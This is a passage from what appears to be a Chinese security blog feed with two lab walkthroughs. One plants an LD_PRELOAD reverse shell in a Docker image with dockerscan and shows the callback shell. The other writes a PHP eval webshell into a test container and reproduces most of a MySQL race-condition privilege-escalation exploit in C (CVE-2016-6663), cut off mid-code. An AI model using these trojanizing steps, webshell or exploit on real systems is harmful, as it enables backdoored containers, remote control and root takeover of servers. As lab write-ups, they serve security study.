class="number">10</span>M</span><br></pre></td></tr></table></figure></p><p>4.修改镜像，添加trojanize反弹shell<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 输入命令</span></span><br><span class="line">dockerscan image modify trojanize -l <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> -p <span class="number">8888</span> tutum_lamp -o tutum_lamp_modify_trojanize</span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp'</span></span><br><span class="line">[<span class="meta"> * </span>] Image troyanized successful</span><br><span class="line">[<span class="meta"> * </span>] Trojanized image location:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; /home/ubuntu/dockerscan/tutum_lamp_modify_trojanize.tar</span><br><span class="line">[<span class="meta"> * </span>] To receive the reverse shell, only write:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; nc -v -k -l <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure></p><p>5.导入新的镜像并运行<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入命令</span></span><br><span class="line">docker load -i tutum_lamp_modify_trojanize.tar</span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -d tutum/lamp</span></span><br></pre></td></tr></table></figure></p><p>5.控制端监听,获取权限，执行命令<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入命令</span></span><br><span class="line">ubuntu@VM-<span class="number">234</span>-<span class="number">6</span>-<span class="symbol">ubuntu:</span>~$ nc -lvk <span class="number">8888</span></span><br><span class="line"><span class="comment"># 输出结果如下</span></span><br><span class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port <span class="number">8888</span>)</span><br><span class="line">Connection from [<span class="number">192.168</span>.<span class="number">1.100</span>] port <span class="number">8888</span> [tcp/*] accepted (family <span class="number">2</span>, sport <span class="number">48152</span>)</span><br><span class="line">connecting people</span><br><span class="line">ls</span><br><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">create_mysql_admin_user.sh</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line"><span class="class"><span class="keyword">lib</span></span></span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">run.sh</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start-apache2.sh</span><br><span class="line">start-mysqld.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure></p><p>6.再次分析添加trojanize反弹shell后的镜像信息<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dockerscan image info tutum_lamp_modify_trojanize.tar </span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp_modify_trojanize.tar'</span></span><br><span class="line">[<span class="meta"> * </span>] Analysis finished. Results:</span><br><span class="line">[<span class="meta"> * </span>] - Created date = <span class="number">2016</span><span class="number">-02</span><span class="number">-15</span>T10:<span class="number">35</span>:<span class="number">01.761164611</span>Z</span><br><span class="line">[<span class="meta"> * </span>] - Author = Fernando Mayo , Feng Honglin </span><br><span class="line">[<span class="meta"> * </span>] - Cmd = /run.sh</span><br><span class="line">[<span class="meta"> * </span>] - Docker version = <span class="number">1.9</span><span class="number">.1</span></span><br><span class="line">[<span class="meta"> * </span>] - Host name = dfc2eabdf236</span><br><span class="line">[<span class="meta"> * </span>] - Environment:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">[<span class="meta"> * </span>]   &gt; DEBIAN_FRONTEND=noninteractive</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_UPLOAD_MAX_FILESIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_POST_MAX_SIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; REMOTE_ADDR=<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span><br><span class="line">[<span class="meta"> * </span>]   &gt; REMOTE_PORT=<span class="number">8888</span></span><br><span class="line">[<span class="meta"> * </span>]   &gt; LD_PRELOAD=/usr/share/lib/reverse_shell.so</span><br><span class="line">[<span class="meta"> * </span>] - Exposed ports:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">80</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">3306</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br></pre></td></tr></table></figure></p><h2 id="0x02原理小结"><a href="#0x02原理小结" class="headerlink" title="0x02原理小结"></a>0x02原理小结</h2><p>1.修改镜像内容copy reverse_shell.so文件到/usr/share/lib/reverse_shell.so，<br>2.添加环境变量REMOTE_ADDR=192.168.1.100，REMOTE_PORT=8888，LD_PRELOAD=/usr/share/lib/reverse_shell.so<br>3.利用LD_PRELOAD预先加载在每次允许docker镜像时反弹shell回来。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql提权</title>
      <link href="/2017/05/19/Mysql_Privilege_Escalation/"/>
      <url>/2017/05/19/Mysql_Privilege_Escalation/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。<br> <a id="more"></a></p><h2 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h2><p>1.采用tutum/lamp的docker作为测试系统环境<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker运行及必要环境配置</span></span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -P tutum/lamp</span></span><br><span class="line"><span class="bash">docker <span class="built_in">exec</span> -it &lt;container_id&gt; /bin/bash</span></span><br><span class="line"><span class="bash">apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev</span></span><br><span class="line"><span class="bash"><span class="comment"># webshell写入</span></span></span><br><span class="line"><span class="bash"><span class="built_in">echo</span> <span class="string">"&lt;?php @eval(\$_POST[1]);?&gt;"</span> &gt;  /var/www/html/shell.php</span></span><br><span class="line"><span class="bash">chmod -R 777 /var/www/html</span></span><br></pre></td></tr></table></figure></p><p>2.数据库配置<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户test,密码123456,授予权限<span class="keyword">create</span>,<span class="keyword">drop</span>,<span class="keyword">insert</span>,<span class="keyword">select</span></span><br><span class="line">mysql</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> testdb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'test'</span>@<span class="string">'%'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'123456'</span>; </span><br><span class="line">grant <span class="keyword">create</span>,<span class="keyword">drop</span>,<span class="keyword">insert</span>,<span class="keyword">select</span> <span class="keyword">on</span> testdb.* <span class="keyword">to</span> <span class="string">'test'</span>@<span class="string">'%'</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p><h2 id="0x02-www-data权限提升为mysql权限"><a href="#0x02-www-data权限提升为mysql权限" class="headerlink" title="0x02 www-data权限提升为mysql权限"></a>0x02 www-data权限提升为mysql权限</h2><p>利用CVE-2016-6663<br>1.菜刀链接webshell，然后上传需要用到的mysql-privesc-race.c文件，内容如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;grp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/inotify.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_PATH          <span class="meta-string">"/tmp/mysql_privesc_exploit"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_DIRN          <span class="meta-string">"mysql_privesc_exploit"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="meta-string">"/exploit_table.MYD"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="meta-string">"/exploit_table.TMD"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUID_SHELL     EXP_PATH <span class="meta-string">"/mysql_suid_shell.MYD"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_DELAY 1000    <span class="comment">// can be used in the race to adjust the timing if necessary</span></span></span><br><span class="line"></span><br><span class="line">MYSQL *conn;  <span class="comment">// DB handles</span></span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intro</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( </span><br><span class="line">        <span class="string">"\033[94m\n"</span></span><br><span class="line">        <span class="string">"MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span></span><br><span class="line">        <span class="string">"mysql-privesc-race.c (ver. 1.0)\n\n"</span></span><br><span class="line">        <span class="string">"CVE-2016-6663 / CVE-2016-5616\n\n"</span></span><br><span class="line">        <span class="string">"For testing purposes only. Do no harm.\n\n"</span></span><br><span class="line"><span class="string">"Discovered/Coded by:\n\n"</span></span><br><span class="line"><span class="string">"Dawid Golunski \n"</span></span><br><span class="line"><span class="string">"http://legalhackers.com"</span></span><br><span class="line">        <span class="string">"\033[0m\n\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *argv0)</span> </span>&#123;</span><br><span class="line">    intro();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage:\n\n%s user pass db_host database\n\n"</span>, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysql_cmd</span><span class="params">(<span class="keyword">char</span> *sql_cmd, <span class="keyword">int</span> silent)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!silent) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s \n"</span>, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mysql_query(conn, sql_cmd)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    <span class="keyword">if</span> (res&gt;<span class="number">0</span>) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomnum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> io_notified = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> myd_handle;</span><br><span class="line">    <span class="keyword">int</span> wpid;</span><br><span class="line">    <span class="keyword">int</span> is_shell_suid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">/* io notify */</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>] __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line">    <span class="keyword">int</span> num_read;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inotify_event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="comment">/* credentials */</span></span><br><span class="line">    <span class="keyword">char</span> *user     = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *password = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *db_host  = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> *database = argv[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Disable buffering of stdout</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the params</span></span><br><span class="line">    <span class="keyword">if</span> (argc!=<span class="number">5</span>) &#123;</span><br><span class="line">usage(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    intro();</span><br><span class="line">    <span class="comment">// Show initial privileges</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Starting the exploit as: \n"</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the database server with provided credentials</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Connecting to the database `%s` as %s@%s\n"</span>, database, user, db_host);</span><br><span class="line">    conn = mysql_init(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!mysql_real_connect(conn, db_host, user, password, database, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare tmp dir</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Creating exploit temp directory %s\n"</span>, <span class="string">"/tmp/"</span> EXP_DIRN);</span><br><span class="line">    umask(<span class="number">000</span>);</span><br><span class="line">    system(<span class="string">"rm -rf /tmp/"</span> EXP_DIRN <span class="string">" &amp;&amp; mkdir /tmp/"</span> EXP_DIRN);</span><br><span class="line">    system(<span class="string">"chmod g+s /tmp/"</span> EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare exploit tables :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Creating mysql tables \n\n"</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"DROP TABLE IF EXISTS exploit_table"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"DROP TABLE IF EXISTS mysql_suid_shell"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span></span><br><span class="line">    <span class="comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n"</span>);</span><br><span class="line">    system(<span class="string">"cp /bin/bash "</span> SUID_SHELL);</span><br><span class="line">    system(<span class="string">"ls -l "</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use inotify to get the timing right</span></span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"failed to inotify_init\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Entering the race loop... Hang in there...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( is_shell_suid != <span class="number">1</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line"><span class="keyword">if</span> ( (cnt % <span class="number">100</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"-&gt;"</span>);</span><br><span class="line"> <span class="comment">//fflush(stdout);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create empty file , remove if already exists */</span></span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   mysql_cmd(<span class="string">"DROP TABLE IF EXISTS exploit_table"</span>, <span class="number">1</span>);</span><br><span class="line">mysql_cmd(<span class="string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* random num if needed */</span></span><br><span class="line">        srand ( time(<span class="literal">NULL</span>) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fork failed :(\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Child process - executes REPAIR TABLE  SQL statement */</span></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            usleep(<span class="number">500</span>);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">    mysql_cmd(<span class="string">"REPAIR TABLE exploit_table EXTENDED"</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// child stops here</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span></span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            io_notified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> processed = <span class="number">0</span>;</span><br><span class="line">                ret = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    <span class="keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(event-&gt;name, <span class="string">"exploit_table.TMD"</span>)) &#123;</span><br><span class="line">                            <span class="comment">//usleep(randomnum);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 